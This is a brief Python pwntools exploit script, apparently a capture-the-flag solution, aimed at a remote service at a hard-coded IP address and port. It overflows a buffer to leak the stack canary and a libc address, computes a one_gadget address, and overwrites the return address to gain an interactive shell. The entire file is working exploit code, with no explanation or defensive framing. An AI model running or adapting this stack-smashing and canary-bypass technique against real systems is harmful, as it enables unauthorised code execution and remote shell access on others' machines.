from pwn import *

def go(pay):
    p.sendline(pay)

#p = process('./elf.bin')
p = remote('1.224.175.29', 9981)
#e = ELF('./elf.bin')
#l = e.libc

#context.log_level = 'debug'

p.recv()
go('1')
sleep(0.3)
go('a'*0x119)

p.recv()
go('2')

p.recvuntil('a'*0x118)
canary = u64(p.recv(8)) - ord('a')

go('1')
go('a'*0x128)
pause()
go('2')

libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x21b97
magic = libc + 0x4f322
print hex(libc)

go('1')
go('a'*0x118+p64(canary)+p64(magic)*2)

go('3')

p.interactive()